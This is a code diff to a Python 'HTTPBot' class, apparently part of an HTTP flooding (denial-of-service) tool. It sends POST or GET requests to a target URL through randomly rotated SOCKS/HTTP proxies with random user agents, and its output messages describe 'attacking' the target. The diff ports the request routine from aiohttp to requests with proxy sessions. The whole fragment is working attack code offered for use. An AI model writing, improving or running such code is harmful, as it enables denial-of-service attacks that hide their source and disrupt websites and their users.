@@ -1,7 +1,7 @@
-import aiohttp  
 import random
-import asyncio
+import requests
 from pystyle import Colorate, Colors
+from socks import socksocket, PROXY_TYPE_SOCKS4, PROXY_TYPE_SOCKS5
 
 COLOR_CODE = {
     "RESET": "\033[0m",  
@@ -29,19 +29,29 @@ class HTTPBot:
     def get_random_user_agent(self):
         return random.choice(self.user_agents)
 
-    async def send_request(self, session, url, payload=None):
+    def send_request(self, url, payload=None):
         proxy = self.get_random_proxy()
         user_agent = self.get_random_user_agent()
-        proxy_url = f"{proxy['protocol']}://{proxy['host']}:{proxy['port']}"
 
         try:
-            async with session.post(url, data=payload, headers={"User-Agent": user_agent}, proxy=proxy_url) as response:
-                if response.status < 500:
-                    sentsuccess = f"🦈 Shark successfully attacked the fish: {url} frоm: {proxy['host']}:{proxy['port']} Nom-Nom!"
-                    print(Colorate.Horizontal(Colors.blue_to_white, (sentsuccess)))
-                else:
-                    sentfalse = f"🐟 Oh No! The fish: {url} escaped from: {proxy['host']}:{proxy['port']} Get better proxies!"
-                    print(Colorate.Horizontal(Colors.blue_to_white, (sentfalse)))
+            session = requests.Session()
+            session.proxies = {
+                "http": f"{proxy['protocol']}://{proxy['host']}:{proxy['port']}",
+                "https": f"{proxy['protocol']}://{proxy['host']}:{proxy['port']}",
+            }
+            session.headers.update({"User-Agent": user_agent})
+
+            if payload:
+                response = session.post(url, data=payload, timeout=5)
+            else:
+                response = session.get(url, timeout=5)
+
+            if response.status_code < 500:
+                sentsuccess = f"🦈 Shark successfully attacked the fish: {url} frоm: {proxy['host']}:{proxy['port']} Nom-Nom!"
+                print(Colorate.Horizontal(Colors.blue_to_white, (sentsuccess)))
+            else:
+                sentfalse = f"🐟 Oh No! The fish: {url} escaped from: {proxy['host']}:{proxy['port']} Get better proxies!"
+                print(Colorate.Horizontal(Colors.blue_to_white, (sentfalse)))
         except Exception as e:
             sentfalse = f"🐟 Oh No! The fish: {url} escaped from: {proxy['host']}:{proxy['port']} Get better proxies!"
             print(Colorate.Horizontal(Colors.blue_to_white, (sentfalse)))
